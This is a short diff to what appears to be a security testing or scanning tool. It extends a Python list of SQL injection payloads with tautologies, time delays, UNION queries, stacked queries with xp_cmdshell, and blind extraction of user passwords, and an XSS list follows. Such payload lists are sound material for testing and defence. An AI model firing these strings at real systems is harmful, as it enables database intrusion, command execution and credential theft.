@@ -32,6 +32,11 @@ SQLI = [
     "1 AND SLEEP(5)", "' OR SLEEP(5)#", "1' AND 1=1 -- ", "x' OR 'a'='a", "1 OR 1=1",
     "'; INSERT INTO users VALUES('a','b')--", "1 AND BENCHMARK(1000000,MD5(1))",
     "1' ORDER BY 10-- ", "\" OR \"\"=\"",
+    "1 HAVING 1=1", "1' HAVING 1=1-- ", "1 GROUP BY 1 HAVING 1=1", "1 OR 1 LIKE 1",
+    "1' OR 'x' LIKE 'x", "1' OR 2>1 -- ", "1 AND 2>1", "1; WAITFOR DELAY '0:0:5'--",
+    "1' UNION ALL SELECT NULL,NULL-- ", "' OR 1=1#", "1; EXEC xp_cmdshell('dir')--",
+    "1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64",
+    "1 AND (SELECT COUNT(*) FROM users)>0", "1 OR true",
 ]
 XSS = [
     "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
